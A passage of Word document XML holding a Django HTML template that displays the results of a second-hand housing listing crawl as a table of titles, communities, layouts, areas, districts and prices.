          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>开始爬取</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51861AE6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       &lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8F62B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   &lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D9F228" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F95681D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C1CF1BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% if page_obj %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3F7BC0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;h3&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>爬取二手房结果</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3737B4DF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;table class="table table-striped"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC05B5F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B945494" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;tr&gt;            &lt;th&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>标题</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D22A4D9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;th&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小区</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D46514" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;th&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>房厅</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2691C238" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;th&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>面积</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3604D5CC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;th&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>板块</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5204F687" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;th&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>总价</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>万</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77946672" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;th&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>单价</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>元</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>平方米</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76395637" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696B1570" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;/thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF4D0A1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;tbody&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9EC555" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">     {% for house in page_obj %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6536D907" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F46311B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2222F562" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            {{ house.title }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF6632E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48849510" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305D35C1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            {{ house.house }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFFDAEA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BA64BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B192300" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            {{ house.bedroom }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA6EE02" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708D8A40" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">             &lt;td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9BB8B0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">             {{ house.area }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2DBF53" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5D91E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E20C7B0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">             {{ house.location }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04447608" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70CE36E1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">             &lt;td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A1412B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            {{ house.total_price }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657526BF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A0BCAC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C74A7F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                {{ house.unit_price }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413EFD5A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            &lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58921503" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">     {% endfor %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79CAFABF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283F7A6E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;/tbody&gt;&lt;/table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA23D6C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
